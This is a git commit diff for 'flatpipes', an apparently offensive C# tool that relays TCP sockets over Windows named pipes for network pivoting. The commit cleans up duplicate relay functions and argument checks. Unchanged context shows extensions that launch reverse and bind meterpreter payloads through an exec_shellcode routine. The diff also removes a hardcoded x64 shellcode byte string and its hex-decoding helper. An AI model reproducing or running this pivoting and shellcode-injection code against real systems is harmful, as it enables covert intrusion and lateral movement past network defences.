eea13a907419b0a034d7f2844cb914a6812476cf
dxflatline <dc.flatline@gmail.com>
2017-04-25 13:13:30 +0300

    Duplicate functions clean-up

--- flatpipes/flatpipes.cs
+++ flatpipes/flatpipes.cs
@@ -81,6 +81,7 @@ namespace flatpipesns
     {
         static void Main(string[] args)
         {
+
             // HANLDE PARAMS
             if (args.Length<6)
             {
@@ -102,10 +103,30 @@ namespace flatpipesns
             String extension = null;
             if (args.Length == 7) extension = args[6];
 
+
+            // Check some unsupported conditions
+            if ((extension != null) && (String.Compare(pmode, "pclient") == 0))
+            {
+                Console.WriteLine("[*] Extensions are not currently supported on pclient. Use on pserver only.");
+                Environment.Exit(1);
+            }
+            if ( String.Compare(smode, "sclient") == 0 && String.Compare(extension, "revmeter") == 0)
+            {
+                Console.WriteLine("[*] Reverse payload on sclient config does not make sense. Use sserver instead.");
+                Environment.Exit(1);
+            }
+            if ( String.Compare(smode, "sserver") == 0 && String.Compare(extension, "bindmeter") == 0)
+            {
+                Console.WriteLine("[*] Bind payload on sserver config does not make sense. Use sclient instead.");
+                Environment.Exit(1);
+            }
+
+
             // PRINT ARCHITECTURE
             if (IntPtr.Size == 4) Console.WriteLine("[!] Running as 32-bit");
             else if (IntPtr.Size == 8) Console.WriteLine("[!] Running as 64-bit");
             else Console.WriteLine("[!] Running in the future");
+
 
             // PIPE SERVER IMPLEMENTATION
             if (String.Compare(pmode, "pserver") ==0)
@@ -153,11 +174,6 @@ namespace flatpipesns
                         //WaitForSingleObject(hThread, 0xFFFFFFFF);
                         //Console.WriteLine("[!] Extension " + extension + " 4");
                     }
-                    else if (String.Compare(extension, "revmeter") == 0 && String.Compare(smode, "sclient") == 0)
-                    {
-                        Console.WriteLine("[*] Reverse payload on sclient config does not make sense. Use sserver instead.");
-                        Environment.Exit(1);
-                    }
                     else if (String.Compare(extension, "bindmeter") == 0 && String.Compare(smode, "sclient") == 0)
                     {
                         Console.WriteLine("[!] Extension " + extension + " starting.");
@@ -185,11 +201,6 @@ namespace flatpipesns
                         shellcodeProcessHandle = exec_shellcode(ShellCode_c);
                         //WaitForSingleObject(hThread, 0xFFFFFFFF);
                         //Console.WriteLine("[!] Extension " + extension + " 4");
-                    }
-                    else if (String.Compare(extension, "bindmeter") == 0 && String.Compare(smode, "sserver") == 0)
-                    {
-                        Console.WriteLine("[*] Bind payload on sserver config does not make sense. Use sclient instead.");
-                        Environment.Exit(1);
                     }
                     else if (String.Compare(extension, "customhex") == 0)
                     {
@@ -249,8 +260,8 @@ namespace flatpipesns
                 }
 
                 // Start the upstream/downstream handling tasks
-                Server_SocketToWritePipe(networkStream, ss_s2c);
-                Server_ReadPipeToSocket(networkStream, ss_c2s);
+                SocketToWritePipe(networkStream, ss_s2c);
+                ReadPipeToSocket(networkStream, ss_c2s);
 
                 if (shellcodeProcessHandle != IntPtr.Zero)
                 {
@@ -265,6 +276,7 @@ namespace flatpipesns
 
             }
 
+
             // PIPE CLIENT IMPLEMENTATION
             else if (String.Compare(pmode, "pclient") == 0)
             {
@@ -272,35 +284,21 @@ namespace flatpipesns
                 // Even if pserver is not online, it will block until it opens (seems to wait forever)
                 var pipe_s2c = new NamedPipeClientStream(pipeaddr, pipename + "_s2c", PipeDirection.In, PipeOptions.None); // Reading from server
                 var pipe_c2s = new NamedPipeClientStream(pipeaddr, pipename + "_c2s", PipeDirection.Out, PipeOptions.None); // Writing to server
-                pipe_s2c.Connect();
-                Console.WriteLine("[!] Connected to server's downstream pipe");
-                pipe_c2s.Connect();
-                Console.WriteLine("[!] Connected to server's upstream pipe");
+                try
+                {
+                    pipe_s2c.Connect();
+                    Console.WriteLine("[!] Connected to server's downstream pipe");
+                    pipe_c2s.Connect();
+                    Console.WriteLine("[!] Connected to server's upstream pipe");
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[*] Error while connecting to pipe. Exiting..");
+                    Environment.Exit(1);
+                }
                 StreamString ss_s2c = new StreamString(pipe_s2c);
                 StreamString ss_c2s = new StreamString(pipe_c2s);
 
-                // Check for extensions execution
-                if (extension != null)
-                {
-                    if (String.Compare(extension, "revmeter") == 0)
-                    {
-                        Console.WriteLine("[*] Reverse payload on pclient does not make sense. Ignoring..");
-                    }
-                    else if (String.Compare(extension, "bindmeter") == 0)
-                    {
-                        Console.WriteLine("[*] Bind payload on pclient does not make sense. Ignoring..");
-                    }
-                    else if (String.Compare(extension, "customhex") == 0)
-                    {
-                        String ShellCode_pre = "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xe0\\x1d\\x2a\\x0a\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\\x63\\x00";
-                        byte[] shellcode_bytes = StringToByteArray(ShellCode_pre);
-                        String ShellCode_enc = Convert.ToBase64String(shellcode_bytes, 0, shellcode_bytes.Length);
-                        ss_c2s.WriteString(ShellCode_enc);
-                    }
-
-                }
-
-                // Handle socket communication
                 // Handle socket requirements
                 NetworkStream networkStream = null;
                 if (String.Compare(smode, "sclient") == 0)
@@ -348,8 +346,8 @@ namespace flatpipesns
                 }
 
                 // Start the upstream/downstream handling tasks
-                Client_ReadPipeToSocket(networkStream, ss_s2c);
-                Client_SocketToWritePipe(networkStream, ss_c2s);
+                ReadPipeToSocket(networkStream, ss_s2c);
+                SocketToWritePipe(networkStream, ss_c2s);
 
                 // loop
                 Console.WriteLine("[!] Job done. Waiting forever.");
@@ -360,11 +358,11 @@ namespace flatpipesns
 
 
         /// <summary> 
-        /// Pipe server functions.
-        /// From read pipe (c2s) to socket
-        /// From socket to write pipe (s2c) 
+        /// Pipe functions.
+        /// From read pipe to socket
+        /// From socket to write pipe
         /// </summary>
-        static void Client_ReadPipeToSocket(System.Net.Sockets.NetworkStream networkStream, StreamString ss)
+        static void ReadPipeToSocket(System.Net.Sockets.NetworkStream networkStream, StreamString ss)
         {
             Task.Factory.StartNew(() =>
             {
@@ -376,15 +374,14 @@ namespace flatpipesns
                     dataDecoded = Convert.FromBase64String(dataEncoded);
                     if (dataDecoded.Length > 0)
                     {
-                        Console.WriteLine("Client_ReadPipeToConsole: Encoded Length " + dataEncoded.Length);
-                        Console.WriteLine("Client_ReadPipeToConsole: Decoded Length " + dataDecoded.Length);
+                        Console.WriteLine("ReadPipeToSocket: Encoded " + dataEncoded.Length + " / Decoded " + dataDecoded.Length);
                         networkStream.Write(dataDecoded, 0, dataDecoded.Length);
                     }
                 }
             });
         }
 
-        static void Client_SocketToWritePipe(System.Net.Sockets.NetworkStream networkStream, StreamString ss)
+        static void SocketToWritePipe(System.Net.Sockets.NetworkStream networkStream, StreamString ss)
         {
             Task.Factory.StartNew(() =>
             {
@@ -398,8 +395,7 @@ namespace flatpipesns
                         String s = Convert.ToBase64String(netReadBuffer, 0, charsread);
                         if (charsread > 0)
                         {
-                            Console.WriteLine("Client_SocketToWritePipe: Decoded Length " + charsread);
-                            Console.WriteLine("Client_SocketToWritePipe: Encoded Length " + s.Length);
+                            Console.WriteLine("SocketToWritePipe: Decoded " + charsread + " / Encoded " + s.Length);
                             ss.WriteString(s);
                         }
                     }
@@ -407,72 +403,6 @@ namespace flatpipesns
             });
         }
 
-
-        /// <summary> 
-        /// Pipe client functions.
-        /// From read pipe (s2c) to socket
-        /// From socket to write pipe (c2s) 
-        /// </summary>
-        static void Server_ReadPipeToSocket(System.Net.Sockets.NetworkStream networkStream, StreamString ss)
-        {
-            Task.Factory.StartNew(() =>
-            {
-                String dataEncoded;
-                byte[] dataDecoded;
-                while (true)
-                {
-                    dataEncoded = ss.ReadString();
-                    dataDecoded = Convert.FromBase64String(dataEncoded);
-                    if (dataDecoded.Length > 0)
-                    { 
-                        Console.WriteLine("Server_PipeToSocket: Encoded Length " + dataEncoded.Length);
-                        Console.WriteLine("Server_PipeToSocket: Decoded Length " + dataDecoded.Length);
-                        networkStream.Write(dataDecoded, 0, dataDecoded.Length);
-                    }
-                }
-
-            });
-        }
-
-        static void Server_SocketToWritePipe(System.Net.Sockets.NetworkStream networkStream, StreamString ss)
-        {
-            Task.Factory.StartNew(() =>
-            {
-                byte[] netReadBuffer = new byte[1024];
-                int charsread = 0;
-                while (true)
-                {
-                    if (networkStream.CanRead)
-                    {
-                        charsread = networkStream.Read(netReadBuffer, 0, 250);
-                        String s = Convert.ToBase64String(netReadBuffer, 0, charsread);
-                        if (charsread > 0)
-                        {
-                            Console.WriteLine("Server_SocketToWritePipe: Decoded Length " + charsread);
-                            Console.WriteLine("Server_SocketToWritePipe: Encoded Length " + s.Length);
-                            ss.WriteString(s);
-                        }
-                    }
-
-                }
-            });
-        }
-
-
-
-        /// <summary> 
-        /// Helper: Gets a hex string (\xfc\xcb\x04) and explode to byte[]
-        /// </summary>
-        private static byte[] StringToByteArray(String hex)
-        {
-            int NumberChars = hex.Length / 4;
-            byte[] bytes = new byte[NumberChars];
-            for (int i = 0; i < NumberChars; i++)
-            {
-                bytes[i] = Convert.ToByte(hex.Substring((i * 4) + 2, 2), 16);
-            }
-            return bytes;
-        }
 
         /// <summary> 
         /// Decompress: Decompress a gzip byte[]
